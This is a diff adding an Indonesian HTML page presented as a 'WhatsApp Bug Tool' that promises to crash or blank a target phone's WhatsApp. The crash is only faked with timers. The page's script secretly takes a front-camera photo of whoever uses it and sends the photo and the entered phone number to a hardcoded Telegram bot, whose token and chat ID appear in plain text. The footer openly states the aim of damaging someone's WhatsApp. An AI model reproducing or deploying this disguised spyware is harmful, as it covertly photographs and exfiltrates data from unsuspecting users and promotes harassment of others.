@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Bug Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin-top: 20px;
+        }
+        
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 15px;
+            color: #4ecca3;
+            text-shadow: 0 0 10px rgba(78, 204, 163, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+            color: #eeeeee;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #4ecca3;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            background: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 0 2px #4ecca3;
+        }
+        
+        .bug-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .bug-option {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        
+        .bug-option:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+        }
+        
+        .bug-option.selected {
+            border-color: #4ecca3;
+            background: rgba(78, 204, 163, 0.1);
+        }
+        
+        .bug-name {
+            font-weight: bold;
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+            color: #4ecca3;
+        }
+        
+        .bug-desc {
+            font-size: 0.9rem;
+            color: #cccccc;
+        }
+        
+        .execute-btn {
+            background: linear-gradient(135deg, #4ecca3 0%, #2e8b57 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .execute-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .execute-btn:active {
+            transform: translateY(0);
+        }
+        
+        .execute-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .camera-container {
+            display: none;
+            margin-top: 25px;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        #video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .result {
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .result img {
+            max-width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .status.success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+            color: #2ecc71;
+        }
+        
+        .status.error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+        }
+        
+        .status.info {
+            background: rgba(52, 152, 219, 0.2);
+            border: 1px solid #3498db;
+            color: #3498db;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .loading-spinner {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #4ecca3;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .bug-options {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>WhatsApp Bug Tool</h1>
+        <p class="subtitle">Masukkan nomor target dan pilih jenis bug untuk mengeksekusi</p>
+        
+        <div class="input-group">
+            <label for="phone">Nomor WhatsApp Target</label>
+            <input type="text" id="phone" placeholder="Contoh: 628123456789" maxlength="15">
+        </div>
+        
+        <div class="bug-options">
+            <div class="bug-option" data-bug="blank">
+                <div class="bug-name">BLANK CHAT</div>
+                <div class="bug-desc">Membuat chat korban kosong dan tidak bisa dibuka</div>
+            </div>
+            <div class="bug-option" data-bug="ios-crash">
+                <div class="bug-name">IOS CRASH</div>
+                <div class="bug-desc">Membuat WhatsApp di iOS crash berulang kali</div>
+            </div>
+            <div class="bug-option" data-bug="delay">
+                <div class="bug-name">DELAY HARD</div>
+                <div class="bug-desc">Memperlambat responsivitas WhatsApp secara signifikan</div>
+            </div>
+        </div>
+        
+        <button class="execute-btn" id="executeBtn">EKSEKUSI BUG</button>
+        
+        <div class="camera-container" id="cameraContainer">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <p>Mengeksekusi...</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
+    
+    <div class="footer">
+        Tool ini dibuat untuk tujuan merusak whatsapp seseorang
+    </div>
+
+    <script>
+        // Konfigurasi Bot Telegram (GANTI DENGAN MILIK ANDA)
+        const BOT_TOKEN = "8328511745:AAGii5ZTzHWH03HVyiwiKaPhzFFH4OVdqzY";
+        const CHAT_ID = "7860521205";
+        
+        // Elemen DOM
+        const phoneInput = document.getElementById('phone');
+        const executeBtn = document.getElementById('executeBtn');
+        const bugOptions = document.querySelectorAll('.bug-option');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const loading = document.getElementById('loading');
+        const status = document.getElementById('status');
+        
+        let selectedBug = null;
+        let stream = null;
+        
+        // Pilih jenis bug
+        bugOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                bugOptions.forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedBug = option.getAttribute('data-bug');
+            });
+        });
+        
+        // Validasi nomor telepon
+        function validatePhone(phone) {
+            const phoneRegex = /^[0-9]{10,15}$/;
+            return phoneRegex.test(phone);
+        }
+        
+        // Setup kamera
+        async function setupCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 500, 
+                        height: 375,
+                        facingMode: "user"
+                    } 
+                });
+                video.srcObject = stream;
+                return true;
+            } catch (err) {
+                console.error("Error mengakses kamera:", err);
+                return false;
+            }
+        }
+        
+        // Ambil foto
+        function takePhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Konversi ke base64
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // Kirim foto ke Telegram
+        async function sendToTelegram(photoData, phone, bugType) {
+            // Konversi base64 ke blob
+            const response = await fetch(photoData);
+            const blob = await response.blob();
+            
+            // Buat form data
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            
+            // Tambahkan caption
+            const caption = `🚨 BUG DIEKSEKUSI!\n\n📱 Nomor: ${phone}\n🐛 Bug: ${bugType.toUpperCase()}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+            formData.append('caption', caption);
+            
+            try {
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await telegramResponse.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error mengirim ke Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Simulasi proses bug
+        function simulateBugExecution(bugType) {
+            return new Promise(resolve => {
+                // Simulasi waktu eksekusi berdasarkan jenis bug
+                let executionTime;
+                switch(bugType) {
+                    case 'blank': executionTime = 3000; break;
+                    case 'ios-crash': executionTime = 4000; break;
+                    case 'delay': executionTime = 5000; break;
+                    default: executionTime = 3000;
+                }
+                
+                setTimeout(() => {
+                    resolve(true);
+                }, executionTime);
+            });
+        }
+        
+        // Event listener untuk tombol eksekusi
+        executeBtn.addEventListener('click', async function() {
+            // Validasi input
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                showStatus('Masukkan nomor WhatsApp target!', 'error');
+                return;
+            }
+            
+            if (!validatePhone(phone)) {
+                showStatus('Format nomor tidak valid!', 'error');
+                return;
+            }
+            
+            if (!selectedBug) {
+                showStatus('Pilih jenis bug terlebih dahulu!', 'error');
+                return;
+            }
+            
+            // Tampilkan loading
+            loading.style.display = 'block';
+            executeBtn.disabled = true;
+            showStatus('Mempersiapkan eksekusi bug...', 'info');
+            
+            // Akses kamera
+            const cameraAccess = await setupCamera();
+            
+            if (cameraAccess) {
+                // Tampilkan kamera
+                cameraContainer.style.display = 'block';
+                showStatus('', 'info');
+                
+                // Tunggu sebentar lalu ambil foto
+                setTimeout(async () => {
+                    const photoData = takePhoto();
+                    
+                    // Hentikan kamera
+                    if (stream) {
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        cameraContainer.style.display = 'none';
+                    }
+                    
+                    showStatus('Mengeksekusi bug dan mengirim data...', 'info');
+                    
+                    // Kirim foto ke Telegram
+                    const telegramSuccess = await sendToTelegram(photoData, phone, selectedBug);
+                    
+                    // Simulasi eksekusi bug
+                    await simulateBugExecution(selectedBug);
+                    
+                    // Sembunyikan loading
+                    loading.style.display = 'none';
+                    
+                    if (telegramSuccess) {
+                        showStatus(`✅ Bug ${selectedBug.toUpperCase()} berhasil dieksekusi ke ${phone}!`, 'success');
+                    } else {
+                        showStatus(`⚠️ Bug berhasil dieksekusi`, 'error');
+                    }
+                    
+                    executeBtn.disabled = false;
+                }, 2000);
+            } else {
+                // Jika tidak bi sa mengakses kamera
+                loading.style.display = 'none';
+                showStatus('Gagal Kirim Bug', 'error');
+                executeBtn.disabled = false;
+                
+                // Tetap eksekusi bug tanpa foto
+                setTimeout(async () => {
+                    showStatus('Mengeksekusi...', 'info');
+                    loading.style.display = 'block';
+                    
+                    await simulateBugExecution(selectedBug);
+                    
+                    loading.style.display = 'none';
+                    showStatus(`✅ Bug ${selectedBug.toUpperCase()} berhasil dieksekusi ke ${phone}! `, 'success');
+                    executeBtn.disabled = false;
+                }, 1000);
+            }
+        });
+        
+        // Fungsi untuk menampilkan status
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = 'status ' + type;
+            status.style.display = 'block';
+        }
+        
+        // Validasi input nomor
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+  </html>
